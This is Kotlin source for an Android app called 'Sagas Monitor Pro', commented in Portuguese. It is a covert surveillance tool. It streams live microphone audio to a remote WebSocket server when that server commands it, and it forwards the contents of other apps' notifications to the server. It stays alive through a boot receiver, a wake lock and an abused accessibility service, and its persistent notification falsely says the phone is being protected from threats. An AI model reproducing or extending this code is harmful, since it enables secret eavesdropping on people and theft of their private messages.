BootReceiver
package com.example.monitoraudio

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.content.ContextCompat
import kotlin.concurrent.thread

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        val action = intent?.action
        Log.d("MONITOR_PRO", "Boot detectado: $action")

        // goAsync permite que o receiver dure um pouco mais para garantir a subida
        val pendingResult = goAsync()

        thread {
            try {
                val serviceIntent = Intent(context, MonitorService::class.java)
                ContextCompat.startForegroundService(context, serviceIntent)
                Log.d("MONITOR_PRO", "MonitorService iniciado com sucesso no boot.")
            } catch (e: Exception) {
                Log.e("MONITOR_PRO", "Erro crítico ao iniciar no boot: ${e.message}")
            } finally {
                pendingResult.finish()
            }
        }
    }
}

package com.example.monitoraudio

import android.Manifest

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (hasRequiredPermissions()) {
            startMonitor()
        }

        setContent {
            val scrollState = rememberScrollState()

            val permissions = mutableListOf(Manifest.permission.RECORD_AUDIO).apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    add(Manifest.permission.POST_NOTIFICATIONS)
                }
            }.toTypedArray()

            val launcher = rememberLauncherForActivityResult(
                ActivityResultContracts.RequestMultiplePermissions()
            ) { results ->
                if (results.all { it.value }) {
                    startMonitor()
                } else {
                    Toast.makeText(this, "Permissões básicas negadas!", Toast.LENGTH_LONG).show()
                }
            }

            LaunchedEffect(Unit) {
                if (!hasRequiredPermissions()) {
                    launcher.launch(permissions)
                }
            }

            Surface(
                modifier = Modifier.fillMaxSize(),
                color = MaterialTheme.colorScheme.background
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(24.dp)
                        .verticalScroll(scrollState),
                    horizontalAlignment = Alignment.CenterHorizontally,
                    verticalArrangement = Arrangement.Top
                ) {
                    Text("Sagas Monitor Pro", style = MaterialTheme.typography.headlineLarge)
                    Text("Painel de Configuração", style = MaterialTheme.typography.bodyMedium)

                    Spacer(modifier = Modifier.height(30.dp))

                    // PASSO 1: Início Automático
                    Button(onClick = { openAppSettings() }, modifier = Modifier.fillMaxWidth()) {
                        Text("1. PERMITIR INÍCIO AUTOMÁTICO")
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    // PASSO 2: Bateria
                    Button(
                        onClick = { openBatterySettings() },
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error)
                    ) {
                        Text("2. BATERIA: SEM RESTRIÇÕES")
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    // PASSO 3: Acessibilidade
                    Button(
                        onClick = { openAccessibilitySettings() },
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.tertiary)
                    ) {
                        Text("3. ATIVAR ACESSIBILIDADE")
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    // NOVO PASSO 4: Notificações
                    Button(
                        onClick = { openNotificationAccessSettings() },
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary)
                    ) {
                        Text("4. ACESSO ÀS NOTIFICAÇÕES")
                    }

                    Spacer(modifier = Modifier.height(40.dp))

                    Button(
                        onClick = {
                            startMonitor()
                            Toast.makeText(this@MainActivity, "Monitoramento Ativado!", Toast.LENGTH_SHORT).show()
                        },
                        modifier = Modifier.height(56.dp).fillMaxWidth()
                    ) {
                        Text("LIGAR TUDO AGORA 🎙️💬")
                    }
                }
            }
        }
    }

    private fun hasRequiredPermissions(): Boolean {
        val audio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val notif = ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
            audio && notif
        } else audio
    }

    private fun startMonitor() {
        val intent = Intent(this, MonitorService::class.java)
        try {
            ContextCompat.startForegroundService(this, intent)
        } catch (e: Exception) {
            Log.e("MainActivity", "Erro ao subir serviço: ${e.message}")
        }
    }

    private fun openAppSettings() {
        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        })
    }

    private fun openBatterySettings() {
        try {
            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        } catch (e: Exception) { openAppSettings() }
    }

    private fun openAccessibilitySettings() {
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        } catch (e: Exception) {
            Toast.makeText(this, "Vá em Acessibilidade > Apps Instalados", Toast.LENGTH_LONG).show()
        }
    }

    private fun openNotificationAccessSettings() {
        try {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivity(intent)
            Toast.makeText(this, "Ative o 'Monitor Pro' na lista", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Procure por 'Acesso a Notificações'", Toast.LENGTH_LONG).show()
        }
    }
}

MonitorService
package com.example.monitoraudio

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.*
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.*
import okio.ByteString.Companion.toByteString
import java.nio.*
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

class MonitorService : Service() {
    private var isRecording = false
    private var recorder: AudioRecord? = null
    private var wakeLock: PowerManager.WakeLock? = null

    companion object {
        var webSocket: WebSocket? = null
    }

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .build()

    override fun onBind(i: Intent?): IBinder? = null

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        // Garante que o celular não hiberne o processo
        if (wakeLock == null) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Monitor::Lock")
            wakeLock?.acquire()
        }

        startInFore()

        if (webSocket == null) {
            connect()
        }

        return START_STICKY
    }

    private fun startInFore() {
        val channelId = "monitor_audio_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, "System Monitor", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }

        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Proteção Ativa")
            .setContentText("O sistema está monitorando ameaças.")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        } else {
            startForeground(1, notif)
        }
    }

    private fun connect() {
        val request = Request.Builder().url("wss://agendapro.dev.br").build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                Log.d("MONITOR", "✅ Conectado ao servidor Sagas!")
            }

            override fun onMessage(ws: WebSocket, text: String) {
                Log.d("MONITOR", "🎮 Comando recebido: $text")
                when (text) {
                    "START" -> {
                        if (!isRecording) startAudio()
                    }
                    "STOP_RECORDING" -> {
                        stopAudio()
                    }
                }
            }

            override fun onFailure(ws: WebSocket, t: Throwable, r: Response?) {
                Log.e("MONITOR", "❌ Erro na conexão: ${t.message}")
                webSocket = null
                // Tenta reconectar após 10 segundos
                Handler(Looper.getMainLooper()).postDelayed({ connect() }, 10000)
            }

            override fun onClosing(ws: WebSocket, code: Int, reason: String) {
                webSocket = null
                stopAudio()
                Handler(Looper.getMainLooper()).postDelayed({ connect() }, 5000)
            }
        })
    }

    private fun startAudio() {
        if (isRecording) return
        isRecording = true
        Log.d("MONITOR", "🎙️ Iniciando captura de áudio...")

        thread(priority = Thread.MAX_PRIORITY) {
            Process.setThreadPriority(Process.THREAD_PRIORITY_AUDIO)
            val bufferSize = AudioRecord.getMinBufferSize(
                16000,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT
            ).coerceAtLeast(1024)

            val buffer = ShortArray(512)

            try {
                recorder = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    16000,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT,
                    bufferSize
                )

                if (recorder?.state == AudioRecord.STATE_INITIALIZED) {
                    recorder?.startRecording()

                    while (isRecording && recorder?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                        val read = recorder?.read(buffer, 0, buffer.size) ?: 0
                        if (read > 0 && webSocket != null) {
                            val bytes = ByteBuffer.allocate(read * 2).order(ByteOrder.LITTLE_ENDIAN)
                            bytes.asShortBuffer().put(buffer, 0, read)
                            webSocket?.send(bytes.array().toByteString())
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("MONITOR", "Erro na thread de áudio: ${e.message}")
            } finally {
                // Garante a liberação do hardware ao sair do loop
                releaseRecorder()
            }
        }
    }

    private fun stopAudio() {
        isRecording = false
        Log.d("MONITOR", "🛑 Parando captura e liberando mic...")
        releaseRecorder()
    }

    private fun releaseRecorder() {
        try {
            recorder?.apply {
                if (recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                    stop()
                }
                release()
            }
            recorder = null
        } catch (e: Exception) {
            Log.e("MONITOR", "Erro ao dar release no recorder: ${e.message}")
        }
    }

    override fun onDestroy() {
        stopAudio()
        wakeLock?.let { if (it.isHeld) it.release() }
        webSocket?.close(1000, "Serviço destruído")
        webSocket = null
        super.onDestroy()
    }
}

MyAccessibilityService
package com.example.monitoraudio

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import androidx.core.content.ContextCompat
import android.util.Log

class MyAccessibilityService : AccessibilityService() {

    /**
     * Este método é chamado sempre que algo acontece na tela do celular.
     * Como o serviço de acessibilidade tem prioridade alta, usamos isso
     * para garantir que o nosso serviço de monitoramento nunca fique desligado.
     */
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Log.d("MONITOR", "Evento de acessibilidade detectado")
        checkAndStartService()
    }

    /**
     * Chamado quando o sistema interrompe o serviço (raro).
     */
    override fun onInterrupt() {
        Log.e("MONITOR", "Serviço de Acessibilidade Interrompido")
    }

    /**
     * Este é o momento crucial: quando o usuário ativa a chave nas configurações,
     * o serviço conecta e nós já subimos o áudio na hora.
     */
    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("MONITOR", "Serviço de Acessibilidade Conectado com Sucesso!")
        checkAndStartService()
    }

    /**
     * Função que tenta iniciar o MonitorService.
     * Se o serviço já estiver rodando, o Android apenas ignora (não duplica).
     * Se estiver desligado, ele liga imediatamente.
     */
    private fun checkAndStartService() {
        try {
            val intent = Intent(this, MonitorService::class.java)
            // Usamos startForegroundService porque a Acessibilidade permite
            // que o app "acorde" mesmo em segundo plano.
            ContextCompat.startForegroundService(this, intent)
        } catch (e: Exception) {
            Log.e("MONITOR", "Erro ao reviver o serviço: ${e.message}")
        }
    }
}


NotificationService
package com.example.monitoraudio

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONObject

class NotificationService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val packageName = sbn.packageName
            val extras = sbn.notification.extras

            // Captura o título (contato/grupo) e o corpo da mensagem
            val title = extras.getCharSequence("android.title")?.toString() ?: "Desconhecido"
            val text = extras.getCharSequence("android.text")?.toString() ?: ""

            // Ignora notificações do próprio sistema ou vazias
            if (text.isEmpty() || packageName == "android" || packageName == "com.android.systemui") return

            // Monta o JSON exatamente como o seu script.js e server.js esperam
            val log = JSONObject()
            log.put("type", "notification")
            log.put("app", packageName)
            log.put("title", title)
            log.put("message", text)
            log.put("time", System.currentTimeMillis())

            Log.d("NotificationService", "Processando: $title - $text")

            // ENVIO CRUCIAL: Usa a conexão aberta no MonitorService
            val socket = MonitorService.webSocket
            if (socket != null) {
                socket.send(log.toString())
                Log.d("NotificationService", "✅ Enviado para o painel Sagas")
            } else {
                Log.w("NotificationService", "⚠️ WebSocket offline. Mensagem perdida.")
            }

        } catch (e: Exception) {
            Log.e("NotificationService", "Erro ao processar notificação: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Opcional: Implementar se precisar saber quando o usuário limpou a notificação
    }
}
